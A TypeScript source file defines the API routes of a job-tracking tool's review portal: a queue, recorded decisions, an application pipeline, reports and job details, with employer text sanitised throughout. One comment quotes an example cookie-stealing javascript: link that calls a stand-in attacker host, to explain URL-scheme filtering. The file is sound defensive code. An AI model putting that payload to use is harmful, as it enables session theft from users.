import type { ApplicationStatus } from '../core/types.js';
import type { Repositories } from '../db/repositories/index.js';
import type { Database } from '../db/database.js';
import { addNote, pipelineSummary, recordApplication, skipRole } from '../applications/track.js';
import { funnel, segments, SEGMENT_DIMENSIONS, type SegmentDimension } from '../analytics/funnel.js';
import { search } from '../search/query.js';
import { canonicalizeUrl } from '../normalize/url.js';
import { singleLine, truncate } from '../normalize/text.js';
import type { RouteHandler, RouteResult } from './server.js';
import type { Logger } from '../util/logger.js';

/**
 * Phase 6.5: the review portal.
 *
 * Everything here is a client over the modules the CLI already calls —
 * `recordApplication`, `skipRole`, `funnel`, `search`. The web layer decides
 * nothing: if the portal and the terminal ever disagreed about what applying to
 * a role means, one of them would be lying, and it would not be obvious which.
 *
 * Two rules shape every response:
 *
 * - Posting-derived text is normalised to a single line and length-bounded here
 *   as well as escaped by the page. The page builds DOM through `textContent`
 *   and never `innerHTML`, so markup cannot render; this is the second layer,
 *   for the terminal-control and layout-breaking characters that are not markup.
 * - Nothing is submitted anywhere. "Apply" records that the user applied. The
 *   portal cannot fill a form, and the button says so.
 */

export interface ReviewRouteDependencies {
  logger: Logger;
  openDb: () => { db: Database; repos: Repositories };
}

const STATUSES: readonly ApplicationStatus[] = [
  'APPLIED',
  'RECRUITER_SCREEN',
  'INTERVIEWING',
  'FINAL',
  'OFFER',
  'REJECTED',
  'WITHDRAWN',
  'CLOSED',
];

function ok(json: unknown): RouteResult {
  return { status: 200, json };
}

function badRequest(json: unknown): RouteResult {
  return { status: 400, json };
}

function notFound(json: unknown): RouteResult {
  return { status: 404, json };
}

/** Third-party text, bounded and flattened before it leaves the process. */
function safe(value: string | undefined, max = 240): string | undefined {
  if (value === undefined) return undefined;
  const cleaned = singleLine(value);
  return cleaned.length === 0 ? undefined : truncate(cleaned, max);
}

function safeList(values: unknown, max = 3): string[] {
  if (!Array.isArray(values)) return [];
  return values
    .filter((entry): entry is string => typeof entry === 'string')
    .slice(0, max)
    .map((entry) => safe(entry) ?? '')
    .filter((entry) => entry.length > 0);
}

/**
 * A link the page may follow.
 *
 * The employer supplies this. `canonicalizeUrl` accepts only `http:` and
 * `https:`, and `source_url` is stored raw when canonicalisation fails — so a
 * posting advertising `javascript:fetch('http://attacker/'+document.cookie)`
 * would otherwise arrive here, be rendered as the link, and be handed to
 * `open()` when the user recorded that they had applied. `noopener` does
 * nothing about that: it is not a window reference problem, it is a scheme
 * problem. A posting whose only URL is unusable is shown without one.
 */
export function safeExternalUrl(...candidates: Array<string | undefined>): string | undefined {
  for (const candidate of candidates) {
    const canonical = canonicalizeUrl(candidate);
    if (canonical) return canonical;
  }
  return undefined;
}

/** Bounds a list the caller could otherwise make arbitrarily long. */
function bounded<T>(values: T[], max: number): { items: T[]; omitted: number } {
  return values.length <= max
    ? { items: values, omitted: 0 }
    : { items: values.slice(-max), omitted: values.length - max };
}

/** A window boundary that is not a date is a usage error, not a silent full scan. */
function isoOrUndefined(value: string | null): string | undefined | null {
  if (value === null || value.trim().length === 0) return undefined;
  const parsed = new Date(value);
  return Number.isNaN(parsed.getTime()) ? null : parsed.toISOString();
}

const MAX_HISTORY = 50;
const MAX_NOTES = 50;
const MAX_APPLICATIONS = 100;

interface Reasoning {
  assessment?: { concerns?: unknown; questions_to_verify?: unknown; strengths?: unknown };
}

export function createReviewRoutes(deps: ReviewRouteDependencies): Record<string, RouteHandler> {
  return {
    /**
     * The review queue: what the system thinks is worth attention, with the
     * reasoning and the authenticity signals beside it.
     *
     * A queue that shows only a score is a queue that asks to be trusted. The
     * concerns and the things to verify are the part a human is actually better
     * at judging than the model was.
     */
    'GET /api/queue': ({ query }) => {
      const { repos } = deps.openDb();
      const limit = Math.min(Math.max(Number.parseInt(query.get('limit') ?? '20', 10) || 20, 1), 100);
      const decisions = query.get('decision') === 'APPLY' ? (['APPLY'] as const) : (['APPLY', 'MAYBE'] as const);

      const evaluations = repos.evaluations.listRecommendations(limit, [...decisions]);

      const items = evaluations.flatMap((evaluation) => {
        const job = repos.jobs.findById(evaluation.jobId);
        if (!job) return [];

        const screening = repos.screenings.latestForJob(job.id);
        const application = repos.applications.findByJob(job.id);
        const feedback = repos.applications.feedbackForJob(job.id);
        const posting = repos.postings.listForJob(job.id)[0];
        const assessment = (evaluation.advocate as Reasoning | undefined)?.assessment;

        return [
          {
            jobId: job.id,
            company: safe(job.companyName, 80),
            title: safe(job.title, 140),
            location: safe(job.locationText, 80),
            level: job.level,
            salaryMin: job.salaryMin,
            salaryMax: job.salaryMax,
            firstSeenAt: job.firstSeenAt,
            url: safeExternalUrl(posting?.applyUrl, posting?.canonicalUrl, posting?.sourceUrl),
            decision: evaluation.decision,
            score: evaluation.score,
            confidence: evaluation.confidence,
            headline: safe(evaluation.headline),
            strengths: safeList(assessment?.strengths),
            concerns: safeList(assessment?.concerns),
            verify: safeList(assessment?.questions_to_verify),
            authenticity: screening
              ? {
                  freshness: screening.authenticity.freshness,
                  hiringIntent: screening.authenticity.hiringIntent,
                  fraudRisk: screening.authenticity.fraudRisk,
                  provenance: screening.authenticity.provenance,
                }
              : undefined,
            // A role already decided stays visible with its decision shown,
            // rather than vanishing: the queue is a record, not an inbox.
            decided: application
              ? { kind: 'applied', status: application.currentStatus, at: application.appliedAt }
              : feedback.length > 0
                ? { kind: 'skipped', at: feedback[feedback.length - 1]?.createdAt }
                : undefined,
          },
        ];
      });

      return ok({ items });
    },

    /**
     * Records a decision. It does not make one, and it cannot submit anything.
     *
     * The URL is not taken from the request. `recordApplication` derives it
     * from the posting, so a caller cannot attach a link of its own choosing to
     * a role and have it stored as the place the user applied.
     */
    'POST /api/decide': ({ body }) => {
      const payload = (body ?? {}) as { jobId?: unknown; action?: unknown; reason?: unknown };
      const jobId = typeof payload.jobId === 'string' ? payload.jobId : '';
      const action = payload.action === 'apply' || payload.action === 'skip' ? payload.action : undefined;

      if (!jobId || !action) return badRequest({ recorded: false, reason: 'jobId and action are required' });

      const { repos } = deps.openDb();
      const job = repos.jobs.findById(jobId);
      if (!job) return notFound({ recorded: false, reason: 'no such job' });

      const reason = typeof payload.reason === 'string' ? payload.reason.slice(0, 500) : undefined;

      if (action === 'apply') {
        const result = recordApplication(repos, job, reason === undefined ? {} : { reason });

        return ok({
          recorded: true,
          action,
          status: result.application.currentStatus,
          overrode: result.overrode,
          url: safeExternalUrl(result.application.applicationUrl),
        });
      }

      const result = skipRole(repos, job, reason === undefined ? {} : { reason });
      return ok({ recorded: true, action, overrode: result.overrode });
    },

    /**
     * The pipeline: every application, its current state, and how it got there.
     *
     * Bounded on purpose. A year of daily use is a few hundred applications and
     * a few thousand status events, and building all of them into one response
     * would block the single process this whole product runs in.
     */
    'GET /api/pipeline': ({ query }) => {
      const { repos } = deps.openDb();

      const limit = Math.min(Math.max(Number.parseInt(query.get('limit') ?? '50', 10) || 50, 1), MAX_APPLICATIONS);
      const applications = repos.applications.list({ limit });

      return ok({
        summary: pipelineSummary(repos),
        statuses: STATUSES,
        limit,
        applications: applications.map((application) => {
          const job = repos.jobs.findById(application.jobId);
          const history = bounded(repos.applications.history(application.id), MAX_HISTORY);
          const notes = bounded(repos.notes.listForJob(application.jobId), MAX_NOTES);

          return {
            id: application.id,
            jobId: application.jobId,
            company: safe(job?.companyName, 80),
            title: safe(job?.title, 140),
            status: application.currentStatus,
            appliedAt: application.appliedAt ?? application.createdAt,
            archetypeId: application.archetypeId,
            decisionAtApply: application.decisionAtApply,
            scoreAtApply: application.scoreAtApply,
            url: safeExternalUrl(application.applicationUrl),
            historyOmitted: history.omitted,
            history: history.items.map((event) => ({
              from: event.fromStatus,
              to: event.toStatus,
              at: event.occurredAt,
              note: safe(event.notes),
            })),
            notesOmitted: notes.omitted,
            notes: notes.items.map((note) => ({
              at: note.createdAt,
              text: safe(note.text, 500),
            })),
          };
        }),
      });
    },

    /** Advances an application. History is append-only, exactly as in the CLI. */
    'POST /api/pipeline/status': ({ body }) => {
      const payload = (body ?? {}) as { jobId?: unknown; status?: unknown; note?: unknown };
      const jobId = typeof payload.jobId === 'string' ? payload.jobId : '';
      const status = typeof payload.status === 'string' ? payload.status.toUpperCase() : '';

      if (!STATUSES.includes(status as ApplicationStatus)) {
        return badRequest({ updated: false, reason: `status must be one of ${STATUSES.join(', ')}` });
      }

      const { repos } = deps.openDb();
      const job = repos.jobs.findById(jobId);
      if (!job) return notFound({ updated: false, reason: 'no such job' });

      const application = repos.applications.findByJob(jobId);
      if (!application) return badRequest({ updated: false, reason: 'nothing is recorded for that role yet' });

      const note = typeof payload.note === 'string' ? payload.note.slice(0, 1000) : undefined;
      const updated = repos.applications.setStatus(application.id, status as ApplicationStatus, note === undefined ? {} : { note });

      return ok({ updated: true, status: updated.currentStatus });
    },

    'POST /api/note': ({ body }) => {
      const payload = (body ?? {}) as { jobId?: unknown; text?: unknown };
      const jobId = typeof payload.jobId === 'string' ? payload.jobId : '';
      const text = typeof payload.text === 'string' ? payload.text.trim().slice(0, 2000) : '';

      if (!jobId || text.length === 0) return badRequest({ added: false, reason: 'jobId and text are required' });

      const { repos } = deps.openDb();
      const job = repos.jobs.findById(jobId);
      if (!job) return notFound({ added: false, reason: 'no such job' });

      addNote(repos, job, text);
      return ok({ added: true });
    },

    /**
     * Reports: the funnel, one segment of it, and what the model has cost.
     *
     * Computed on request from records, like the CLI. The portal stores no
     * metric of its own, so it cannot drift from what `roleeye stats` says.
     */
    'GET /api/reports': ({ query }) => {
      const { db, repos } = deps.openDb();

      const requested = query.get('segment') ?? 'company';
      const dimension = (SEGMENT_DIMENSIONS.includes(requested as SegmentDimension)
        ? requested
        : 'company') as SegmentDimension;

      const since = isoOrUndefined(query.get('since'));
      if (since === null) return badRequest({ error: 'since must be a date' });

      const window = { since, until: undefined };

      const monthStart = new Date();
      monthStart.setUTCDate(1);
      monthStart.setUTCHours(0, 0, 0, 0);

      return ok({
        funnel: funnel(db, window),
        dimension,
        dimensions: SEGMENT_DIMENSIONS,
        segments: segments(db, dimension, window),
        spend: {
          byStage: repos.llmCalls.summarize(since),
          monthToDate: repos.llmCalls.totalCost(monthStart.toISOString()),
        },
      });
    },

    /**
     * History: the same search the CLI runs, over the same index.
     *
     * Read-only. `search()` refreshes the index by default, and a refresh is a
     * write transaction over the whole corpus — not something a GET should do,
     * and not something a page should be able to run in a loop. The index is
     * synced once when the portal starts.
     */
    'GET /api/history': ({ query }) => {
      const { db } = deps.openDb();
      const text = (query.get('q') ?? '').trim();

      const result = search(
        db,
        {
          ...(text.length > 0 ? { query: text } : {}),
          documentTypes: ['job-description'],
          includeClosed: true,
          limit: 50,
        },
        { skipSync: true },
      );

      return ok({
        hits: result.hits.map((hit) => ({
          ...hit,
          title: safe(hit.title, 140),
          company: safe(hit.company, 80),
          excerpt: safe(hit.excerpt, 220),
        })),
      });
    },

    /** One role, with everything known about it. */
    'GET /api/job': ({ query }) => {
      const id = query.get('id') ?? '';
      const { repos } = deps.openDb();
      const job = repos.jobs.findById(id);

      if (!job) return notFound({ error: 'no such job' });

      const application = repos.applications.findByJob(job.id);
      const evaluation = repos.evaluations.latestForJob(job.id);
      const screening = repos.screenings.latestForJob(job.id);

      return ok({
        job: {
          id: job.id,
          company: safe(job.companyName, 80),
          title: safe(job.title, 140),
          location: safe(job.locationText, 80),
          level: job.level,
          department: safe(job.department, 80),
          firstSeenAt: job.firstSeenAt,
          lastSeenAt: job.lastSeenAt,
          closedAt: job.closedAt,
          salaryMin: job.salaryMin,
          salaryMax: job.salaryMax,
          inScope: job.inScope,
          // The body is bounded hard: this is the largest piece of
          // attacker-written text in the product, and the panel is a summary.
          description: safe(job.descriptionText, 4000),
        },
        postings: repos.postings.listForJob(job.id).map((posting) => ({
          sourceType: posting.sourceType,
          sourceName: posting.sourceName,
          url: safeExternalUrl(posting.applyUrl, posting.canonicalUrl, posting.sourceUrl),
          firstSeenAt: posting.firstSeenAt,
          lastSeenAt: posting.lastSeenAt,
          closedAt: posting.closedAt,
        })),
        snapshots: bounded(repos.snapshots.listForJob(job.id), MAX_HISTORY).items.map((snapshot) => ({
          capturedAt: snapshot.capturedAt,
          hash: snapshot.descriptionHash.slice(0, 12),
        })),
        evaluation: evaluation
          ? {
              decision: evaluation.decision,
              score: evaluation.score,
              headline: safe(evaluation.headline),
              createdAt: evaluation.createdAt,
              concerns: safeList((evaluation.advocate as Reasoning | undefined)?.assessment?.concerns, 5),
              verify: safeList((evaluation.advocate as Reasoning | undefined)?.assessment?.questions_to_verify, 5),
            }
          : undefined,
        screening: screening
          ? {
              eligible: screening.eligible,
              blocked: screening.authenticity.blocked,
              freshness: screening.authenticity.freshness,
              hiringIntent: screening.authenticity.hiringIntent,
              fraudRisk: screening.authenticity.fraudRisk,
              provenance: screening.authenticity.provenance,
              rejections: screening.rejections.map((rejection) => safe(`${rejection.rule}: ${rejection.detail}`, 200)),
            }
          : undefined,
        application: application
          ? {
              status: application.currentStatus,
              appliedAt: application.appliedAt,
              history: bounded(repos.applications.history(application.id), MAX_HISTORY).items.map((event) => ({
                from: event.fromStatus,
                to: event.toStatus,
                at: event.occurredAt,
                note: safe(event.notes),
              })),
            }
          : undefined,
        notes: bounded(repos.notes.listForJob(job.id), MAX_NOTES).items.map((note) => ({
          at: note.createdAt,
          text: safe(note.text, 500),
        })),
      });
    },
  };
}
